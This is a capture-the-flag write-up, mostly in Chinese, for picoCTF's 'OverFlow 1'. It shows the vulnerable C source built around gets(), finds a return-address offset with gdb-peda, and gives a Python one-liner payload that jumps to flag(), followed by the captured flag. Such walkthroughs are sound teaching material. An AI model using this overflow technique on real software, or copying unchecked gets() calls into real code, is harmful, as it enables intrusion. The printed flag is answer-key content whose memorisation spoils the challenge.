## OverFlow 1
### 題目:
>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program?




## 思路:
這題的bufsize只有64byte，然而在get的時候沒有設限制，假如取超過64byte就會溢位，於是我們用這個漏洞然後的跳到flag的位置
```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}

```


## 解法:
>分兩部分執行，找到偏移量，和flag的記憶體位置。
>找到flag 的位置在 0x80485e6
```console
gdb-peda$ print flag
$2 = {<text variable, no debug info>} 0x80485e6 <flag>

```
利用gdb-peda的pattern印出隨便的字串 再用crashoff印出偏移量
```console
gdb-peda$ pattern create 100
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
gdb-peda$ r
Starting program: /root/Desktop/overflow1/vuln 
Give me a string and lets see what happens: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
gdb-peda$ crashoff
0x41344141 found at offset: 76

```
最後將偏移量放好再加上flag的記憶體位置，這邊要注意由於是Little Endian因此我們要將記憶體位置倒過來
```console
runmdy@pico-2019-shell1:/problems/overflow-1_5_c76a107db1438c97f349f6b2d98fd6f8$ python -c "print 'a'*76+'\xe6\x85\x04\x08'" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn532066483}Segmentation fault (core dumped)
```
python -c "print 'a'*76+'\xe6\x85\x04\x08'" | ./vuln
## flag:
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn532066483}